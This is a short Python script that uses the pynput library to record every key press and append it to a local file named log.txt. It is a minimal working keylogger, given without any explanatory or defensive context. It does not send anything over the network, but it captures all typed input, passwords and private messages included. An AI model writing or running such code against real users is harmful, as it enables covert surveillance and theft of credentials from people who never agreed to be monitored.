
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as file:
        file.write(f"{key}\n")

with Listener(on_press=on_press) as listener:
    listener.join()
